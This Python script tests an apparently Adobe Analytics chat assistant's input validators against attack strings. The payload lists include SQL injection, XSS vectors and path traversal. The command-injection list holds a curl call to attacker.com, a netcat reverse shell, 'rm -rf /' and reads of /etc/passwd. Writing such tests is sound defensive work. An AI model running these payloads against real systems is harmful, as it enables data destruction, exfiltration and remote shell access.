#!/usr/bin/env python3
"""
Security Testing Script
Tests the implemented security measures against various attacks
"""

import sys
import os
from pathlib import Path

# Add project root to path
project_root = Path(__file__).parent
sys.path.insert(0, str(project_root))
sys.path.insert(0, str(project_root / "src"))

from src.security.input_validator import InputValidator, SecurityValidator
from src.security.security_monitor import SecurityMonitor

class SecurityTester:
    """Security testing framework"""
    
    def __init__(self):
        self.input_validator = InputValidator()
        self.security_validator = SecurityValidator()
        self.security_monitor = SecurityMonitor()
        self.test_results = {}
    
    def run_all_tests(self):
        """Run all security tests"""
        print("🔒 Starting Security Tests...")
        print("=" * 50)
        
        self.test_sql_injection()
        self.test_xss_attacks()
        self.test_command_injection()
        self.test_path_traversal()
        self.test_buffer_overflow()
        self.test_authentication_security()
        
        self.print_summary()
    
    def test_sql_injection(self):
        """Test SQL injection protection"""
        print("\n📊 Testing SQL Injection Protection...")
        
        sql_payloads = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "' UNION SELECT * FROM admin --",
            "; INSERT INTO admin (password) VALUES ('hacked'); --",
            "'; WAITFOR DELAY '00:00:05' --",
            "' AND (SELECT COUNT(*) FROM users) > 0 --"
        ]
        
        blocked_count = 0
        for payload in sql_payloads:
            is_valid, sanitized, threats = self.security_validator.validate_chat_query(payload)
            if not is_valid and "sql_injection" in threats:
                blocked_count += 1
                print(f"  ✅ Blocked: {payload[:30]}...")
            else:
                print(f"  ❌ Missed: {payload[:30]}...")
        
        success_rate = (blocked_count / len(sql_payloads)) * 100
        self.test_results["SQL Injection"] = success_rate
        print(f"  📈 Success Rate: {success_rate:.1f}% ({blocked_count}/{len(sql_payloads)})")
    
    def test_xss_attacks(self):
        """Test XSS protection"""
        print("\n🕷️ Testing XSS Protection...")
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<iframe src=\"javascript:alert('XSS')\"></iframe>",
            "<object data=\"javascript:alert('XSS')\"></object>",
            "javascript:alert('XSS')",
            "<div onmouseover=alert('XSS')>Hover me</div>"
        ]
        
        blocked_count = 0
        for payload in xss_payloads:
            is_valid, sanitized, threats = self.security_validator.validate_chat_query(payload)
            if not is_valid and "xss_attempt" in threats:
                blocked_count += 1
                print(f"  ✅ Blocked: {payload[:30]}...")
            else:
                print(f"  ❌ Missed: {payload[:30]}...")
        
        success_rate = (blocked_count / len(xss_payloads)) * 100
        self.test_results["XSS Protection"] = success_rate
        print(f"  📈 Success Rate: {success_rate:.1f}% ({blocked_count}/{len(xss_payloads)})")
    
    def test_command_injection(self):
        """Test command injection protection"""
        print("\n💻 Testing Command Injection Protection...")
        
        command_payloads = [
            "; ls -la",
            "| cat /etc/passwd",
            "&& whoami",
            "`id`",
            "; curl http://attacker.com/steal",
            "$(cat /etc/passwd)",
            "; rm -rf /",
            "| nc -e /bin/sh attacker.com 4444"
        ]
        
        blocked_count = 0
        for payload in command_payloads:
            is_valid, sanitized, threats = self.security_validator.validate_chat_query(payload)
            if not is_valid and "command_injection" in threats:
                blocked_count += 1
                print(f"  ✅ Blocked: {payload[:30]}...")
            else:
                print(f"  ❌ Missed: {payload[:30]}...")
        
        success_rate = (blocked_count / len(command_payloads)) * 100
        self.test_results["Command Injection"] = success_rate
        print(f"  📈 Success Rate: {success_rate:.1f}% ({blocked_count}/{len(command_payloads)})")
    
    def test_path_traversal(self):
        """Test path traversal protection"""
        print("\n📁 Testing Path Traversal Protection...")
        
        path_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....//....//....//etc/passwd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "/var/log/../../../etc/passwd"
        ]
        
        blocked_count = 0
        for payload in path_payloads:
            # Test both file path validation and general query validation
            is_valid_file, sanitized_file, threats_file = self.security_validator.validate_file_path(payload)
            is_valid_query, sanitized_query, threats_query = self.security_validator.validate_chat_query(payload)
            
            # Consider it blocked if either validation catches it
            path_detected = "path_traversal" in threats_file or "path_traversal" in threats_query
            
            if (not is_valid_file or not is_valid_query) and path_detected:
                blocked_count += 1
                print(f"  ✅ Blocked: {payload[:30]}...")
            else:
                print(f"  ❌ Missed: {payload[:30]}...")
        
        success_rate = (blocked_count / len(path_payloads)) * 100
        self.test_results["Path Traversal"] = success_rate
        print(f"  📈 Success Rate: {success_rate:.1f}% ({blocked_count}/{len(path_payloads)})")
    
    def test_buffer_overflow(self):
        """Test buffer overflow protection"""
        print("\n💣 Testing Buffer Overflow Protection...")
        
        # Test various sizes of input
        test_cases = [
            ("A" * 50000, "Large input"),
            ("A" * 100000, "Very large input"),
            ("B" * 25000, "Medium overflow"),
            ("C" * 1000, "Normal input"),
        ]
        
        blocked_count = 0
        for payload, description in test_cases:
            is_valid, sanitized, threats = self.security_validator.validate_chat_query(payload)
            
            if len(payload) > 20000 and not is_valid:
                blocked_count += 1
                print(f"  ✅ Blocked: {description} ({len(payload)} chars)")
            elif len(payload) <= 20000 and is_valid:
                print(f"  ✅ Allowed: {description} ({len(payload)} chars)")
            else:
                print(f"  ❌ Error: {description} ({len(payload)} chars)")
        
        success_rate = (blocked_count / 3) * 100  # 3 overflow cases
        self.test_results["Buffer Overflow"] = success_rate
        print(f"  📈 Success Rate: {success_rate:.1f}% ({blocked_count}/3 overflow cases blocked)")
    
    def test_authentication_security(self):
        """Test authentication security"""
        print("\n🔐 Testing Authentication Security...")
        
        # Test malicious admin inputs
        malicious_inputs = [
            "admin'; DROP TABLE users; --",
            "<script>alert('hack')</script>",
            "admin$(cat /etc/passwd)",
            "admin' OR '1'='1"
        ]
        
        blocked_count = 0
        for payload in malicious_inputs:
            is_valid, sanitized, threats = self.security_validator.validate_admin_input(payload)
            if not is_valid:
                blocked_count += 1
                print(f"  ✅ Blocked: {payload[:30]}...")
            else:
                print(f"  ❌ Missed: {payload[:30]}...")
        
        success_rate = (blocked_count / len(malicious_inputs)) * 100
        self.test_results["Authentication Security"] = success_rate
        print(f"  📈 Success Rate: {success_rate:.1f}% ({blocked_count}/{len(malicious_inputs)})")
    
    def test_legitimate_queries(self):
        """Test that legitimate queries are not blocked"""
        print("\n✅ Testing Legitimate Queries...")
        
        legitimate_queries = [
            "How do I set up Adobe Analytics tracking?",
            "What are the best practices for implementing segments?",
            "Can you explain how calculated metrics work?",
            "How to configure eVars and props in Adobe Analytics?",
            "What's the difference between hits, visits, and visitors?"
        ]
        
        allowed_count = 0
        for query in legitimate_queries:
            is_valid, sanitized, threats = self.security_validator.validate_chat_query(query)
            if is_valid:
                allowed_count += 1
                print(f"  ✅ Allowed: {query[:40]}...")
            else:
                print(f"  ❌ Blocked: {query[:40]}... (Threats: {threats})")
        
        success_rate = (allowed_count / len(legitimate_queries)) * 100
        self.test_results["Legitimate Queries"] = success_rate
        print(f"  📈 Success Rate: {success_rate:.1f}% ({allowed_count}/{len(legitimate_queries)})")
    
    def print_summary(self):
        """Print test summary"""
        print("\n" + "=" * 50)
        print("🔒 SECURITY TEST SUMMARY")
        print("=" * 50)
        
        total_score = 0
        for test_name, score in self.test_results.items():
            status = "✅ PASS" if score >= 80 else "⚠️ WARN" if score >= 60 else "❌ FAIL"
            print(f"{status} {test_name}: {score:.1f}%")
            total_score += score
        
        overall_score = total_score / len(self.test_results) if self.test_results else 0
        print(f"\n🎯 Overall Security Score: {overall_score:.1f}%")
        
        if overall_score >= 80:
            print("🛡️ SECURITY STATUS: GOOD")
        elif overall_score >= 60:
            print("⚠️ SECURITY STATUS: NEEDS IMPROVEMENT")
        else:
            print("🚨 SECURITY STATUS: CRITICAL - IMMEDIATE ACTION REQUIRED")
        
        print("\n📊 Threat Detection Metrics:")
        try:
            threat_summary = self.security_monitor.get_threat_summary(hours=1)
            print(f"   • Total Security Events: {threat_summary['total_events']}")
            print(f"   • Unique IP Addresses: {threat_summary['unique_ips']}")
            print(f"   • Blocked IPs: {len(self.security_monitor.get_blocked_ips())}")
        except Exception as e:
            print(f"   • Error getting threat metrics: {e}")


def main():
    """Main function"""
    tester = SecurityTester()
    
    try:
        tester.run_all_tests()
        tester.test_legitimate_queries()
    except KeyboardInterrupt:
        print("\n\n❌ Security testing interrupted by user.")
    except Exception as e:
        print(f"\n\n💥 Security testing failed: {e}")
        import traceback
        traceback.print_exc()


if __name__ == "__main__":
    main()
